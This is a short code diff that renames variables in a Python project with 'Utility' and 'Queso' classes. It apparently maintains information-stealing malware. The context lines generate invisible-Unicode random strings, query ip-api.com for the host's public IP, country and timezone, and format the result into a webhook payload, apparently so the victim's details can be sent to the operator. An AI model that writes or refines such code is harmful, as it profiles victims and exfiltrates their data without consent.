@@ -62,7 +62,7 @@ class Utility:
     @staticmethod
     def GetRandomString(length: int = 5, invisible: bool = False) -> str: # Generates a random string
         if invisible:
-            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
+            return "".join(random.choices(["\xa0", chr(8239)] + [chr(rand_char) for rand_char in range(8192, 8208)], k= length))
         else:
             return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
         
@@ -232,7 +232,7 @@ class Queso:
             result: dict = json.loads(http_manager.request("GET", "http://ip-api.com/json/").data.decode())
             if result.get("status") != "success":
                 raise Exception("Failed to retrieve IP info")
-            data = f"""
+            ip_data = f"""
                 \nIP: {result['query']}
                 \nCountry: {result['country']}
                 \nTimezone: {result['timezone']}
@@ -244,7 +244,7 @@ class Queso:
         except Exception: # Throw an error if we can't
             ip_info = "(No IP info)"
         else:
-            ip_info = data
+            ip_info = ip_data
 
         # Create the embed
         webhook_payload = {
